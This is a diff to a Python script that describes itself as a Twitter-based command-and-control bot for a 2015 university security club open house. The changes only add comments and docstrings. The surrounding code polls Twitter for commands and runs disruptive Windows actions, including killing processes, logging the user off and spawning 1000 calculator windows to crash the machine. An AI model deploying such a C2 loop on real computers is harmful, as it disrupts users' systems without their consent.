@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 ''' Author: Jared E Stroud
     Purpose: RIT CSEC Open House Twitter C2 (Fall 2015)
-    Email: lol, just go to Bo.
+    Email: jxs1261@rit.edu
 '''
 
 import requests
@@ -21,6 +21,7 @@ class WindowsCmds():
         '''
             Params: None
             Purpose: Kill Firefox.
+            Return: Nothing.
         '''
         os.system('taskkill /f /im firefox.exe')
 
@@ -28,6 +29,7 @@ class WindowsCmds():
         '''
             Params: None
             Purpose: Kill explorer.exe 
+            Return: Nothing.
         '''
         os.system('taskkill /f /im explorer.exe')
 
@@ -35,6 +37,7 @@ class WindowsCmds():
         '''
             Params: None
             Purpose: Logoff user
+            Return: Nothing.
         '''
         os.system('shutdown /l')
 
@@ -42,6 +45,7 @@ class WindowsCmds():
         '''
             Params: None
             Purpose: Spawn magnify
+            Return: Nothing.
         '''
         os.system('magnify.exe')
 
@@ -49,13 +53,14 @@ class WindowsCmds():
         '''
             Params: None
             Purpose: Death by calc. Bo would approve.
+            Return: Nothing.
 
+            WARNING: This will crash everything.
         '''
         x = 0
         while x < 1000:
             subprocess.Popen(['calc.exe'])
             x += 1
-
 
 
 class TweetScrape():
@@ -148,7 +153,7 @@ if __name__ == "__main__":
     # Object declaration
     twitter = TweetScrape()
 
-    while 1: 
+    while 1: # Continuously loop with a 25 second sleep.
 
         twitter_content = twitter.get_Tweets("https://twitter.com/search?f=tweets&vertical=default&q=%40RITCSEC&src=typd") # Twitter scraping of RITCSECOpenhouse Page.
         command_tweet = twitter.obtain_commands(twitter_content)
